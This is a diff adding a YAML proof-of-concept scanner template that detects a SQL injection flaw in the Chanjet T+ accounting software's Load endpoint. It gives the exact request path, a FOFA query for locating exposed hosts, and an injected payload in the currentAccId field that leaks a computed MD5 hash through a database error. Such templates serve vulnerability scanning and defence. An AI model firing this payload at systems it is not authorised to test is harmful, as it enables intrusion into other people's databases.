@@ -1,0 +1,31 @@
+id: poc-yaml-changjie-tplus-load-sqli
+info:
+  name: 畅捷通T+ Load SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 畅捷通T+
+  fofa: app="畅捷通-TPlus"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanySettingController,Ufida.T.SM.UIP.ashx?method=Load
+  headers:
+    Content-Type: application/json
+  data: '{"currentAccId":"2'' and 1=sys.fn_varbintohexstr(hashbytes(''MD5'', CAST(''{{.t1}}''
+    AS VARCHAR)))--+", "currentAcc":"1", "currentDsName":"1", "currentVersion":"1",
+    "currentVersionNo":"1"}'
+  expression: 'status_code == 200 &&
+
+    contains(body,"0x" + t2) &&
+
+    contains(body,"Ufida.T.EAP.ErrorInfo.DatabaseException") &&
+
+    matches(body,"转换成数据类型(.*?)时失败") &&
+
+    matches(body,"在将(.*?)值")
+
+    '
+transport: http
